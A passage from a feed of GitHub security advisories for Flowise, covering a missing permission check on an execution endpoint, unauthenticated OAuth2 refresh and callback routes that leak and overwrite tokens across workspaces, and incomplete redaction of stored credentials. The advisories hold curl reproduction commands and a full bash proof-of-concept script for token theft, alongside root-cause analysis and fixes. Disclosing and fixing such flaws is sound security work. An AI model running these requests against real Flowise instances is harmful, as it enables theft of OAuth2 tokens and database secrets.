<pre><code class="language-typescript">// packages/server/src/controllers/text-to-speech/index.ts
if (chatflowId) {
    let chatflow;
    let workspaceId = req.user?.activeWorkspaceId;
    
    if (workspaceId) {
        chatflow = await chatflowsService.getChatflowById(chatflowId, workspaceId)
    } else {
        chatflow = await chatflowsService.getChatflowById(chatflowId)
        // Verify the chatflow is public before using its credentials
        if (!chatflow.isPublic) {
            throw new InternalFlowiseError(
                StatusCodes.UNAUTHORIZED,
                'TTS generation requires authentication for non-public chatflows'
            )
        }
        workspaceId = chatflow.workspaceId
    }
    // ... rest of the function
}
</code></pre>
<ol start="2">
<li>Consider applying rate limiting to the TTS endpoint to prevent abuse even for public chatflows.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8gj2-2cvc-6xx7">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8gj2-2cvc-6xx7</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6650">https://github.com/FlowiseAI/Flowise/pull/6650</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/dbec8f9fd3c42faab49416fe81ff1774a5344cba">https://github.com/FlowiseAI/Flowise/commit/dbec8f9fd3c42faab49416fe81ff1774a5344cba</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.4">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.4</a></li>
<li><a href="https://github.com/advisories/GHSA-8gj2-2cvc-6xx7">https://github.com/advisories/GHSA-8gj2-2cvc-6xx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gj2-2cvc-6xx7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T19:19:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Missing Authorization on Execution Update Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-fm2f-4339-4p2f</id>
        <link href="https://github.com/advisories/GHSA-fm2f-4339-4p2f"/>
        <updated>2026-08-04T19:18:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="flowise-security-audit-report">Flowise Security Audit Report</h1>
<p><strong>Date</strong>: 2026-03-17
<strong>Researcher</strong>: Dimpal Jadhav (<a href="mailto:jadhavdimpy@gmail.com">jadhavdimpy@gmail.com</a>)
<strong>GitHub</strong>: <a href="https://github.com/Dimpyj1604">https://github.com/Dimpyj1604</a>
<strong>Target</strong>: FlowiseAI/Flowise (latest main branch)
<strong>Version</strong>: <a href="mailto:flowise-components@3.1.0">flowise-components@3.1.0</a></p>
<h3 id="finding-1-missing-authorization-on-execution-update-endpoint">FINDING 1: Missing Authorization on Execution Update Endpoint</h3>
<p><strong>Severity</strong>: HIGH (CVSS ~7.5)
<strong>Type</strong>: CWE-862 (Missing Authorization)
<strong>File</strong>: <code>packages/server/src/routes/executions/index.ts:11</code></p>
<p><strong>Description</strong>: The <code>PUT /api/v1/executions/:id</code> endpoint lacks the <code>checkAnyPermission()</code> middleware that protects all other execution endpoints (GET, DELETE). Any authenticated user — regardless of their assigned permissions — can modify any execution record.</p>
<p><strong>Evidence</strong>:</p>
<pre><code class="language-typescript">// Line 7 - GET has permission check
router.get('/', checkAnyPermission('executions:view'), executionController.getAllExecutions)

// Line 11 - PUT has NO permission check
router.put(['/', '/:id'], executionController.updateExecution)  // &lt;-- MISSING checkAnyPermission

// Line 14 - DELETE has permission checkadvisory_1_execution_auth_bypass
router.delete('/:id', checkAnyPermission('executions:delete'), executionController.deleteExecutions)
</code></pre>
<p><strong>Impact</strong>: Privilege escalation. A low-privileged user with any valid API key can modify execution state, data, and metadata of any execution in their workspace. Could be used to manipulate workflow execution results or inject data.</p>
<p><strong>Reproduction</strong>:</p>
<pre><code class="language-bash">curl -X PUT https://TARGET/api/v1/executions/EXECUTION_ID \
  -H "Authorization: Bearer LOW_PRIV_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"state": "FINISHED", "data": "MANIPULATED"}'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-fm2f-4339-4p2f">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-fm2f-4339-4p2f</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6409">https://github.com/FlowiseAI/Flowise/pull/6409</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/96a9b23b5a103b362a0ee1368d04636755be1bed">https://github.com/FlowiseAI/Flowise/commit/96a9b23b5a103b362a0ee1368d04636755be1bed</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-fm2f-4339-4p2f">https://github.com/advisories/GHSA-fm2f-4339-4p2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fm2f-4339-4p2f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T19:18:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Cross-Workspace OAuth2 Credential Metadata Leak]]></title>
        <id>https://github.com/advisories/GHSA-wch5-xp77-fxg4</id>
        <link href="https://github.com/advisories/GHSA-wch5-xp77-fxg4"/>
        <updated>2026-08-04T18:01:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Three OAuth2 credential endpoints look up credentials by <code>id</code> alone with no <code>workspaceId</code> filter. Two of these endpoints (<code>callback</code>, <code>refresh</code>) are whitelisted from all authentication. This allows:</p>
<ol>
<li><strong>Cross-workspace credential access</strong> — Any authenticated user can initiate OAuth2 flows against credentials belonging to other workspaces.</li>
<li><strong>Unauthenticated token injection</strong> — An unauthenticated attacker can forge OAuth2 callbacks to overwrite tokens in any credential.</li>
<li><strong>Unauthenticated token refresh</strong> — An unauthenticated attacker can refresh tokens for any credential.</li>
</ol>
<hr>
<h2 id="root-cause">Root Cause</h2>
<h3 id="vulnerable-code-no-workspace-scoping">Vulnerable code: no workspace scoping</h3>
<p>All three OAuth2 handlers query the <code>Credential</code> table by <code>id</code> only:</p>
<p><strong><code>packages/server/src/routes/oauth2/index.ts:80-82</code></strong> (authorize)</p>
<pre><code class="language-typescript">const credential = await credentialRepository.findOneBy({
    id: credentialId
    // Missing: workspaceId filter
})
</code></pre>
<p><strong><code>packages/server/src/routes/oauth2/index.ts:183-185</code></strong> (callback)</p>
<pre><code class="language-typescript">const credential = await credentialRepository.findOneBy({
    id: state as string
    // Missing: workspaceId filter
})
</code></pre>
<p><strong><code>packages/server/src/routes/oauth2/index.ts:314-316</code></strong> (refresh)</p>
<pre><code class="language-typescript">const credential = await credentialRepository.findOneBy({
    id: credentialId
    // Missing: workspaceId filter
})
</code></pre>
<h3 id="correct-pattern-same-codebase">Correct pattern (same codebase)</h3>
<p>The standard credential service correctly enforces workspace isolation:</p>
<p><strong><code>packages/server/src/services/credentials/index.ts:130-132</code></strong></p>
<pre><code class="language-typescript">const credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({
    id: credentialId,
    workspaceId: workspaceId  // &lt;-- Workspace scoping present
})
</code></pre>
<h3 id="authentication-bypass-via-whitelist">Authentication bypass via whitelist</h3>
<p><strong><code>packages/server/src/utils/constants.ts:40-41</code></strong></p>
<pre><code class="language-typescript">export const WHITELIST_URLS = [
    // ...
    '/api/v1/oauth2-credential/callback',   // line 40
    '/api/v1/oauth2-credential/refresh',     // line 41
    // ...
]
</code></pre>
<p><strong><code>packages/server/src/index.ts:223-225</code></strong> — prefix-matched whitelist skips all auth:</p>
<pre><code class="language-typescript">const isWhitelisted = whitelistURLs.some((url) =&gt; req.path.startsWith(url))
if (isWhitelisted) {
    next()  // No JWT verification, no API key check
}
</code></pre>
<hr>
<h2 id="attack-scenarios">Attack Scenarios</h2>
<h3 id="scenario-a-cross-workspace-credential-metadata-leak">Scenario A: Cross-Workspace Credential Metadata Leak</h3>
<p>An authenticated user in Workspace A initiates an OAuth2 authorize flow for a credential belonging to Workspace B. The server returns an authorization URL containing the victim credential's <code>client_id</code>, <code>scope</code>, and <code>redirect_uri</code>.</p>
<pre><code>POST /api/v1/oauth2-credential/authorize/&lt;VICTIM_CREDENTIAL_UUID&gt;
Cookie: connect.sid=&lt;ATTACKER_SESSION&gt;
</code></pre>
<p><strong>Response:</strong></p>
<pre><code class="language-json">{
  "success": true,
  "credentialId": "&lt;VICTIM_CREDENTIAL_UUID&gt;",
  "authorizationUrl": "https://provider.com/oauth2/authorize?client_id=LEAKED_CLIENT_ID&amp;scope=LEAKED_SCOPE&amp;...",
  "redirectUri": "https://flowise-instance/api/v1/oauth2-credential/callback"
}
</code></pre>
<h3 id="scenario-b-unauthenticated-token-injection-via-forged-callback">Scenario B: Unauthenticated Token Injection via Forged Callback</h3>
<p>The callback endpoint requires no authentication and uses the <code>state</code> parameter as the credential lookup key. An attacker who controls an OAuth2 provider (or MitMs the flow) can inject arbitrary tokens into any credential.</p>
<pre><code>GET /api/v1/oauth2-credential/callback?code=ATTACKER_AUTH_CODE&amp;state=&lt;VICTIM_CREDENTIAL_UUID&gt;
(No authentication required)
</code></pre>
<p>The server exchanges the code at the credential's <code>accessTokenUrl</code>, and whatever tokens the provider returns are encrypted and stored into the victim's credential record (line 271):</p>
<pre><code class="language-typescript">await credentialRepository.update(credential.id, {
    encryptedData,      // Contains attacker-controlled token data
    updatedDate: new Date()
})
</code></pre>
<h3 id="scenario-c-unauthenticated-token-refresh">Scenario C: Unauthenticated Token Refresh</h3>
<p>An attacker can refresh any credential's OAuth2 tokens without authentication. The server reads the stored <code>refresh_token</code>, exchanges it at the <code>accessTokenUrl</code>, and returns fresh token metadata.</p>
<pre><code>POST /api/v1/oauth2-credential/refresh/&lt;VICTIM_CREDENTIAL_UUID&gt;
(No authentication required)
</code></pre>
<p><strong>Response:</strong></p>
<pre><code class="language-json">{
  "success": true,
  "credentialId": "&lt;VICTIM_CREDENTIAL_UUID&gt;",
  "tokenInfo": {
    "access_token": "new-access-token-value",
    "token_type": "Bearer",
    "expires_in": 3600,
    "has_new_refresh_token": false,
    "expires_at": "2026-04-13T12:00:00.000Z"
  }
}
</code></pre>
<p>The fresh <code>access_token</code> is returned directly in the response body (line 393-401), giving the attacker a valid OAuth2 token for whatever service the victim credential is connected to.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>A running Flowise instance with at least two workspaces (Workspace A and Workspace B)</li>
<li>An OAuth2 credential configured in Workspace B (the victim)</li>
<li>The credential UUID of the victim credential (obtainable by any member of Workspace B, or via IDOR — see Finding 4)</li>
</ul>
<h3 id="step-1--confirm-unauthenticated-refresh-endpoint-is-reachable">Step 1 — Confirm unauthenticated refresh endpoint is reachable</h3>
<pre><code class="language-bash"># No cookies, no Bearer token — completely unauthenticated
FLOWISE_URL="https://TARGET_INSTANCE"
VICTIM_CRED_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

curl -s -X POST "${FLOWISE_URL}/api/v1/oauth2-credential/refresh/${VICTIM_CRED_ID}" \
  -H "Content-Type: application/json"
</code></pre>
<p><strong>Expected result if credential exists and has a refresh token:</strong></p>
<pre><code class="language-json">{
  "success": true,
  "message": "OAuth2 token refreshed successfully",
  "credentialId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "tokenInfo": {
    "access_token": "&lt;VALID_ACCESS_TOKEN&gt;",
    "token_type": "Bearer",
    "expires_in": 3600,
    "has_new_refresh_token": false,
    "expires_at": "2026-04-13T..."
  }
}
</code></pre>
<p><strong>Expected result if credential not found:</strong></p>
<pre><code class="language-json">{
  "success": false,
  "message": "Credential not found"
}
</code></pre>
<h3 id="step-2--cross-workspace-authorize-requires-any-valid-session">Step 2 — Cross-workspace authorize (requires any valid session)</h3>
<pre><code class="language-bash"># Attacker is authenticated in Workspace A
# They target a credential UUID from Workspace B
ATTACKER_COOKIE="connect.sid=s%3A..."

curl -s -X POST "${FLOWISE_URL}/api/v1/oauth2-credential/authorize/${VICTIM_CRED_ID}" \
  -H "Cookie: ${ATTACKER_COOKIE}" \
  -H "Content-Type: application/json"
</code></pre>
<p><strong>Expected result — victim credential's OAuth2 config is leaked:</strong></p>
<pre><code class="language-json">{
  "success": true,
  "credentialId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "authorizationUrl": "https://login.microsoftonline.com/.../authorize?client_id=VICTIM_CLIENT_ID&amp;scope=VICTIM_SCOPES&amp;...",
  "redirectUri": "https://TARGET_INSTANCE/api/v1/oauth2-credential/callback"
}
</code></pre>
<h3 id="step-3--forge-callback-to-inject-attacker-controlled-tokens">Step 3 — Forge callback to inject attacker-controlled tokens</h3>
<pre><code class="language-bash"># Attacker sets up a rogue OAuth2 provider that returns crafted tokens,
# OR intercepts a legitimate flow.
# The state parameter is the victim credential UUID.

curl -s "${FLOWISE_URL}/api/v1/oauth2-credential/callback?code=ATTACKER_CODE&amp;state=${VICTIM_CRED_ID}"
</code></pre>
<p>The server POSTs the <code>code</code> to the credential's <code>accessTokenUrl</code>. If the attacker controls the OAuth2 provider (or has a valid code), the returned tokens are written into the victim's credential.</p>
<h3 id="full-automated-poc-script">Full automated PoC script</h3>
<pre><code class="language-bash">#!/usr/bin/env bash
set -euo pipefail

# ---- Configuration ----
FLOWISE_URL="${1:?Usage: $0 &lt;flowise_url&gt; &lt;victim_credential_uuid&gt; [attacker_cookie]}"
VICTIM_CRED_ID="${2:?Usage: $0 &lt;flowise_url&gt; &lt;victim_credential_uuid&gt; [attacker_cookie]}"
ATTACKER_COOKIE="${3:-}"

echo "=== OAuth2 Cross-Workspace Credential Hijacking PoC ==="
echo "Target:     ${FLOWISE_URL}"
echo "Credential: ${VICTIM_CRED_ID}"
echo ""

# --- Attack Vector 1: Unauthenticated token refresh ---
echo "[1] Attempting unauthenticated token refresh..."
REFRESH_RESP=$(curl -s -w "\n%{http_code}" -X POST \
  "${FLOWISE_URL}/api/v1/oauth2-credential/refresh/${VICTIM_CRED_ID}" \
  -H "Content-Type: application/json")

HTTP_CODE=$(echo "${REFRESH_RESP}" | tail -1)
BODY=$(echo "${REFRESH_RESP}" | head -n -1)

if [ "${HTTP_CODE}" = "200" ]; then
  echo "[!] VULNERABLE — Unauthenticated token refresh succeeded"
  echo "    Response: ${BODY}" | head -c 500
  echo ""
elif echo "${BODY}" | grep -q "Credential not found"; then
  echo "[*] Credential not found (UUID may be invalid)"
elif echo "${BODY}" | grep -q "Missing required"; then
  echo "[*] Credential exists but has no refresh_token (no prior OAuth2 flow)"
  echo "    This still confirms the endpoint is reachable without auth"
else
  echo "[*] HTTP ${HTTP_CODE}: ${BODY}" | head -c 300
fi
echo ""

# --- Attack Vector 2: Cross-workspace authorize (needs session) ---
if [ -n "${ATTACKER_COOKIE}" ]; then
  echo "[2] Attempting cross-workspace authorize..."
  AUTH_RESP=$(curl -s -w "\n%{http_code}" -X POST \
    "${FLOWISE_URL}/api/v1/oauth2-credential/authorize/${VICTIM_CRED_ID}" \
    -H "Cookie: ${ATTACKER_COOKIE}" \
    -H "Content-Type: application/json")

  HTTP_CODE=$(echo "${AUTH_RESP}" | tail -1)
  BODY=$(echo "${AUTH_RESP}" | head -n -1)

  if [ "${HTTP_CODE}" = "200" ]; then
    echo "[!] VULNERABLE — Cross-workspace credential access confirmed"
    echo "    Leaked authorization URL:"
    echo "${BODY}" | python3 -m json.tool 2&gt;/dev/null || echo "    ${BODY}" | head -c 500
  else
    echo "[*] HTTP ${HTTP_CODE}: ${BODY}" | head -c 300
  fi
else
  echo "[2] Skipped cross-workspace authorize (no attacker cookie provided)"
fi
echo ""

# --- Attack Vector 3: Confirm callback is unauthenticated ---
echo "[3] Confirming callback endpoint is unauthenticated..."
CALLBACK_RESP=$(curl -s -w "\n%{http_code}" \
  "${FLOWISE_URL}/api/v1/oauth2-credential/callback?code=poc_test_code&amp;state=${VICTIM_CRED_ID}")

HTTP_CODE=$(echo "${CALLBACK_RESP}" | tail -1)

# Any response other than 401/403 confirms the endpoint is reachable without auth.
# A 400 with "token_exchange_failed" means the endpoint processed the request
# (tried to exchange the code) — it just failed at the external provider.
if [ "${HTTP_CODE}" = "401" ] || [ "${HTTP_CODE}" = "403" ]; then
  echo "[*] Callback endpoint returned ${HTTP_CODE} — auth is enforced (NOT vulnerable)"
else
  echo "[!] VULNERABLE — Callback endpoint reachable without auth (HTTP ${HTTP_CODE})"
  echo "    The server attempted to process the OAuth2 callback."
  echo "    With a valid authorization code, tokens would be written to the credential."
fi

echo ""
echo "=== PoC Complete ==="
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Vector</th>
<th>Auth Required</th>
<th>Impact</th>
</tr>
</thead>
<tbody><tr>
<td>Credential metadata leak via <code>/authorize</code></td>
<td>Low (any session)</td>
<td>Exposes <code>client_id</code>, <code>scope</code>, <code>redirect_uri</code> from any workspace's credential</td>
</tr>
<tr>
<td>Token injection via <code>/callback</code></td>
<td>None</td>
<td>Overwrite any credential's stored OAuth2 tokens with attacker-controlled values</td>
</tr>
<tr>
<td>Token theft via <code>/refresh</code></td>
<td>None</td>
<td>Obtain a fresh <code>access_token</code> for any credential's connected service (Microsoft 365, Google, etc.)</td>
</tr>
</tbody></table>
<p><strong>Chained impact:</strong> An attacker who obtains a single credential UUID (via IDOR, log exposure, or brute-force of UUIDs) can silently refresh and steal OAuth2 access tokens for external services like Microsoft Graph, Google Workspace, or any custom OAuth2 provider — without any authentication to the Flowise instance.</p>
<hr>
<h2 id="affected-components">Affected Components</h2>
<table>
<thead>
<tr>
<th>File</th>
<th>Lines</th>
<th>Issue</th>
</tr>
</thead>
<tbody><tr>
<td><code>packages/server/src/routes/oauth2/index.ts</code></td>
<td>80-82</td>
<td><code>findOneBy({ id })</code> — no <code>workspaceId</code></td>
</tr>
<tr>
<td><code>packages/server/src/routes/oauth2/index.ts</code></td>
<td>183-185</td>
<td><code>findOneBy({ id: state })</code> — no <code>workspaceId</code></td>
</tr>
<tr>
<td><code>packages/server/src/routes/oauth2/index.ts</code></td>
<td>314-316</td>
<td><code>findOneBy({ id })</code> — no <code>workspaceId</code></td>
</tr>
<tr>
<td><code>packages/server/src/utils/constants.ts</code></td>
<td>40</td>
<td><code>/callback</code> whitelisted from auth</td>
</tr>
<tr>
<td><code>packages/server/src/utils/constants.ts</code></td>
<td>41</td>
<td><code>/refresh</code> whitelisted from auth</td>
</tr>
</tbody></table>
<hr>
<h2 id="remediation">Remediation</h2>
<ol>
<li><strong>Add <code>workspaceId</code> to all credential lookups</strong> in the OAuth2 routes, matching the pattern already used in <code>services/credentials/index.ts:130-132</code>:</li>
</ol>
<pre><code class="language-typescript">// Before (vulnerable)
const credential = await credentialRepository.findOneBy({ id: credentialId })

// After (fixed)
const credential = await credentialRepository.findOneBy({
    id: credentialId,
    workspaceId: req.user?.activeWorkspaceId
})
</code></pre>
<ol start="2">
<li><p><strong>Remove <code>/callback</code> and <code>/refresh</code> from <code>WHITELIST_URLS</code></strong> or implement a signed, time-limited state token that authenticates the callback without a session.</p>
</li>
<li><p><strong>Replace the <code>state</code> parameter</strong> with a cryptographically random nonce bound to the user's session (see also Finding 8).</p>
</li>
<li><p><strong>Do not return <code>access_token</code> in the <code>/refresh</code> response body.</strong> The token should only be stored server-side in the encrypted credential data, never sent to the caller.</p>
</li>
</ol>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wch5-xp77-fxg4">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wch5-xp77-fxg4</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-wch5-xp77-fxg4">https://github.com/advisories/GHSA-wch5-xp77-fxg4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wch5-xp77-fxg4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T18:01:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Incomplete Credential Redaction Exposes Secrets via API]]></title>
        <id>https://github.com/advisories/GHSA-rwrp-9823-p2xq</id>
        <link href="https://github.com/advisories/GHSA-rwrp-9823-p2xq"/>
        <updated>2026-08-04T17:57:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>GET /api/v1/credentials/:id</code> endpoint decrypts stored credential data and returns it in the <code>plainDataObj</code> field of the API response. While a <code>redactCredentialWithPasswordType()</code> function masks fields defined with <code>type: 'password'</code> in their component schema, many credential types store highly sensitive data (database connection URLs with embedded passwords, Google service account JSON with RSA private keys, AWS access keys) in fields defined as <code>type: 'string'</code>. These string-type fields are returned in <strong>full plaintext</strong> without any redaction.</p>
<p>Any authenticated user with <code>credentials:view</code> permission can retrieve the raw secrets of any credential in their workspace by calling this endpoint.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<h3 id="service-layer">Service Layer</h3>
<p><strong><code>packages/server/src/services/credentials/index.ts</code></strong>, <code>getCredentialById()</code> (line 127):</p>
<p>At line 138, the credential's encrypted data is decrypted:</p>
<pre><code class="language-typescript">const decryptedCredentialData = await decryptCredentialData(
    credential.encryptedData,
    credential.credentialName,
    appServer.nodesPool.componentCredentials
)
</code></pre>
<p>At lines 143-146, the decrypted data is attached to the response as <code>plainDataObj</code>:</p>
<pre><code class="language-typescript">const returnCredential: ICredentialReturnResponse = {
    ...credential,
    plainDataObj: decryptedCredentialData    // &lt;-- decrypted secrets in response
}
</code></pre>
<p>At line 147, only <code>encryptedData</code> is stripped, leaving <code>plainDataObj</code> intact:</p>
<pre><code class="language-typescript">const dbResponse: any = omit(returnCredential, ['encryptedData'])
</code></pre>
<h3 id="incomplete-redaction">Incomplete Redaction</h3>
<p><strong><code>packages/server/src/utils/index.ts</code></strong>, <code>redactCredentialWithPasswordType()</code> (line 1697):</p>
<pre><code class="language-typescript">export const redactCredentialWithPasswordType = (
    componentCredentialName: string,
    decryptedCredentialObj: ICredentialDataDecrypted,
    componentCredentials: IComponentCredentials
): ICredentialDataDecrypted =&gt; {
    const plainDataObj = cloneDeep(decryptedCredentialObj)
    for (const cred in plainDataObj) {
        const inputParam = componentCredentials[componentCredentialName].inputs?.find(
            (inp) =&gt; inp.type === 'password' &amp;&amp; inp.name === cred  // &lt;-- only 'password' type
        )
        if (inputParam) {
            plainDataObj[cred] = REDACTED_CREDENTIAL_VALUE
        }
    }
    return plainDataObj
}
</code></pre>
<p>This function <strong>only</strong> redacts fields where <code>inp.type === 'password'</code>. Fields with <code>type: 'string'</code> are returned verbatim, even when they contain secrets.</p>
<h3 id="credential-definitions-storing-secrets-in-string-type-fields">Credential Definitions Storing Secrets in String-Type Fields</h3>
<table>
<thead>
<tr>
<th>Credential</th>
<th>Field</th>
<th>Type</th>
<th>Contains</th>
</tr>
</thead>
<tbody><tr>
<td><code>mongoDBUrlApi</code></td>
<td><code>mongoDBConnectUrl</code></td>
<td><code>string</code></td>
<td><code>mongodb+srv://user:password@host/db</code></td>
</tr>
<tr>
<td><code>googleVertexAuth</code></td>
<td><code>googleApplicationCredential</code></td>
<td><code>string</code></td>
<td>Full service account JSON with RSA private key</td>
</tr>
<tr>
<td><code>postgresUrl</code></td>
<td><code>postgresUrl</code></td>
<td><code>string</code></td>
<td><code>postgresql://user:password@host/db</code></td>
</tr>
<tr>
<td><code>redisCacheUrlApi</code></td>
<td><code>redisUrl</code></td>
<td><code>string</code></td>
<td><code>redis://user:password@host:port</code></td>
</tr>
<tr>
<td><code>awsApi</code></td>
<td><code>awsKey</code></td>
<td><code>string</code></td>
<td>AWS Access Key ID</td>
</tr>
<tr>
<td><code>langfuseApi</code></td>
<td><code>langFusePublicKey</code></td>
<td><code>string</code></td>
<td>Langfuse API public key</td>
</tr>
<tr>
<td><code>httpBasicAuth</code></td>
<td><code>basicAuthUsername</code></td>
<td><code>string</code></td>
<td>HTTP Basic Auth username</td>
</tr>
</tbody></table>
<p>There are 60+ credential definitions in <code>packages/components/credentials/</code>, many with sensitive string-type fields.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="environment">Environment</h3>
<ul>
<li>Flowise v3.0.13 (<code>flowiseai/flowise:latest</code> Docker image)</li>
<li>Authenticated as admin user via enterprise auth</li>
</ul>
<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
<ol>
<li>Start Flowise and log in as any user with <code>credentials:view</code> permission.</li>
<li>Create a MongoDB credential with a connection URL containing embedded credentials:</li>
</ol>
<pre><code class="language-bash">curl -X POST "http://TARGET:3000/api/v1/credentials" \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -H "Cookie: token=&lt;jwt-token&gt;" \
  -d '{
    "name": "MongoDB Production",
    "credentialName": "mongoDBUrlApi",
    "plainDataObj": {
      "mongoDBConnectUrl": "mongodb+srv://admin:SuperSecretPassword123@cluster0.abc123.mongodb.net/mydb"
    }
  }'
</code></pre>
<ol start="3">
<li>Retrieve the credential by ID:</li>
</ol>
<pre><code class="language-bash">curl -X GET "http://TARGET:3000/api/v1/credentials/&lt;credential-id&gt;" \
  -H "x-request-from: internal" \
  -H "Cookie: token=&lt;jwt-token&gt;"
</code></pre>
<h3 id="observed-result">Observed Result</h3>
<p>The API returns the MongoDB connection URL in <strong>full plaintext</strong>, including the embedded password:</p>
<pre><code class="language-json">{
  "id": "e9543cad-8c0c-422e-9990-090c3b1dc3ab",
  "name": "MongoDB Production",
  "credentialName": "mongoDBUrlApi",
  "createdDate": "2026-02-07T17:35:29.000Z",
  "updatedDate": "2026-02-07T17:35:29.000Z",
  "plainDataObj": {
    "mongoDBConnectUrl": "mongodb+srv://admin:SuperSecretPassword123@cluster0.abc123.mongodb.net/mydb"
  }
}
</code></pre>
<p>The same test with a Google Vertex Auth credential returned the <strong>complete service account JSON including the RSA private key</strong> in plaintext:</p>
<pre><code class="language-json">{
  "id": "f7768444-a4fc-4fa3-8e5e-d0d4df89fb56",
  "name": "Google Vertex Auth",
  "credentialName": "googleVertexAuth",
  "plainDataObj": {
    "googleApplicationCredential": "{\"type\":\"service_account\",\"private_key\":\"-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWep4PAtGoL3VBpFe97XRQFQB\\n-----END RSA PRIVATE KEY-----\\n\",\"client_email\":\"mybot@my-project-123.iam.gserviceaccount.com\"}",
    "projectID": "my-project-123"
  }
}
</code></pre>
<p>For comparison, an OpenAI API key (where the field is typed as <code>password</code>) was <strong>correctly redacted</strong>:</p>
<pre><code class="language-json">{
  "plainDataObj": {
    "openAIApiKey": "_FLOWISE_BLANK_07167752-1a71-43b1-"
  }
}
</code></pre>
<p>This confirms the redaction is only applied to <code>password</code>-type fields, leaving <code>string</code>-type fields fully exposed.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Database credential theft</strong>: MongoDB, PostgreSQL, Redis, MySQL connection URLs with embedded passwords are returned in full plaintext. An attacker can use these to directly access production databases.</li>
<li><strong>Cloud service account compromise</strong>: Google service account JSON with RSA private keys is returned in plaintext, enabling full impersonation of the service account across Google Cloud.</li>
<li><strong>AWS key exposure</strong>: AWS Access Key IDs stored in <code>string</code>-type fields are exposed, enabling enumeration of active AWS credentials.</li>
<li><strong>Lateral movement</strong>: Stolen credentials enable pivoting from the Flowise instance to connected cloud services, databases, and APIs.</li>
<li><strong>Multi-user workspace risk</strong>: In multi-user deployments, any user with <code>credentials:view</code> permission can harvest all workspace credentials via the API.</li>
</ul>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Apply <code>redactCredentialWithPasswordType()</code> to <strong>all</strong> sensitive credential fields, not just those typed as <code>password</code>. Any field containing secrets (connection strings, JSON credentials, access keys) should be redacted.</li>
<li>Consider never returning <code>plainDataObj</code> in API responses. The UI should use masked previews (e.g., <code>mongodb+srv://admin:****@cluster0...</code>) instead of full values.</li>
<li>Re-type sensitive credential fields from <code>string</code> to <code>password</code> in component credential definitions to ensure they are covered by the existing redaction logic.</li>
<li>Add a separate <code>secret: true</code> flag to credential field definitions to explicitly mark sensitive fields regardless of their input type.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-rwrp-9823-p2xq">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-rwrp-9823-p2xq</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-rwrp-9823-p2xq">https://github.com/advisories/GHSA-rwrp-9823-p2xq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rwrp-9823-p2xq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T17:57:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Information Disclosure in GET /api/v1/upsert-history returns the entire server-wide upsert history]]></title>
        <id>https://github.com/advisories/GHSA-fr6g-7cq8-fg82</id>
